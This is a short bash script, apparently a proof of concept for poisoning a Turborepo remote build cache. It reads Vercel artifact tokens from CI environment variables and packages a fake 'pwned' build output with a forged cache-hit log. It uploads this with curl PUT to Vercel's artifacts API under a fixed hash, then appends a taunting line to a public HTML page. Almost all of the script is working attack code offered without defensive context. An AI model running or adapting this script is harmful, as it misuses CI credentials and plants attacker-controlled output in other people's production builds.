#!/usr/bin/env bash
set -u

echo "turbo dry run"
turbo run build --dry-run=json > /tmp/dry.json 2>/dev/null

echo "----PUT----"
API="https://vercel.com/api"
TEAM="$VERCEL_ARTIFACTS_OWNER"
TOKEN="$VERCEL_ARTIFACTS_TOKEN"
HASH="4003f1ca98463840"
echo $TEAM


mkdir -p /tmp/poison/packages/web/dist /tmp/poison/packages/web/.turbo
echo '{"name":"youuu","version":"4.1.0","main":"index.js","scripts":{"build":"echo \"pwned via turbo cache poisoning\""}}' > /tmp/poison/packages/web/dist/package.json
echo 'console.log("pwned via turbo cache poisoning")' > /tmp/poison/packages/web/dist/index.js
echo '<h1>Poisoned by turbo cache PoC</h1>' > /tmp/poison/packages/web/dist/index.html
echo "cache hit, replaying output $HASH" > /tmp/poison/packages/web/.turbo/turbo-build.log

tar -cf artifact.tar -C /tmp/poison packages/web/dist/ packages/web/.turbo/turbo-build.log
zstd -f artifact.tar


echo "curl -sS -X PUT $API/v8/artifacts/$HASH?teamId=$TEAM"

curl -sS -X PUT \
  "$API/v8/artifacts/$HASH?teamId=$TEAM" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/octet-stream" \
  -H "x-artifact-duration: 0" \
  --data-binary @artifact.tar.zst \
  -w 'PUT HTTP %{http_code}\n'

mkdir -p public && echo 'go see prod babe <3 -->' >> public/index.html